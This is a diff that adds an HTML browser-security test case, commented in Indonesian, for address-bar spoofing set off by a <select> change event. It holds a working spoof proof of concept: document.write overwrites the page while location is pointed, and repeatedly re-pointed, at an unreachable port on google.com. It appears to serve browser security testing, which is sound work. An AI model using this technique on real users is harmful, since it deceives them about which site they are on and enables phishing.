@@ -1,0 +1,19 @@
+<!-- 4 | address-bar spoof - SUMBER ACTIVATION = <select> | [1-CLICK, bukan tombol]
+     GENOME  A=dead-port  B=location=  C=select/change  D=S1  F=document.write
+     KENAPA INI BEDA  knob C biasanya cuma "ada gesture / tidak". Di sini gesture-nya datang dari
+     widget NATIF (<select>) yang membuka popup OS. Beberapa engine memperlakukan aktivasi dari
+     menu natif berbeda dari klik biasa - itulah sel genome yang jarang diuji.
+     PREDIKAT  sama dgn 1.html. EXPECTED-SECURE  sama. KONTROL  3.html -->
+<select onchange="go()">
+  <option>-- pilih untuk menjalankan --</option>
+  <option>Jalankan 4</option>
+</select>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+function go() {
+  document.write('<h2>SPOOFED via &lt;select&gt; &mdash; bukan google.com</h2>');
+  location = 'https://www.google.com:82';
+  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
+}
+</script>
